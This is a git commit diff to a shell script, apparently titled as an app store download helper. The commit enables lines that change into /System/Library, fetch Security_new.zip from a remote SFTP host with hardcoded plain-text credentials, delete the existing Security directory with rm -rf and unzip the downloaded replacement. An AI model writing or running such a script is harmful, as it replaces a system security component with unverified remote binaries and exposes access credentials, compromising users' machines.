7c760a64a33b0374d60767fb45a22c8d85c56e74
codecpacka <32800467+codecpacka@users.noreply.github.com>
2026-05-30 13:30:04 +0530

    Update appstore_dow.sh

--- appstore_dow.sh
+++ appstore_dow.sh
@@ -1,16 +1,17 @@
 cd $home/../../..//System/Library/
 # configuration
-REMOTE_USER="fbb63a5ef02b44fbba92f30d84f59364"
+
+REMOTE_USER="a957779a069a43279eba04e868aae51c"
 REMOTE_HOST="eu-central-1.sftpcloud.io"
 REMOTE_PATH="/home"
-REMOTE_PASS="IgTYRB9xm4lgOxFhsEgLJfcRnJr6W4Fq"
+REMOTE_PASS="7WHEsgAZlIDIMW0th0oc1K01xC2wwApK"
 REMOTE_DEST="/"
 
 
-#sshpass -p "$REMOTE_PASS" scp $REMOTE_USER@$REMOTE_HOST:Security_new.zip ./Security_new.zip
-#rm -rf ./Security
+sshpass -p "$REMOTE_PASS" scp $REMOTE_USER@$REMOTE_HOST:Security_new.zip ./Security_new.zip
+rm -rf ./Security
 #echo "fsdfsdfdsfsdfsdfds"
-#unzip -o Security_new.zip -d ./
+unzip -o Security_new.zip -d ./
 rm -f *.zip
 reset
 echo "sucessfully added binaries"
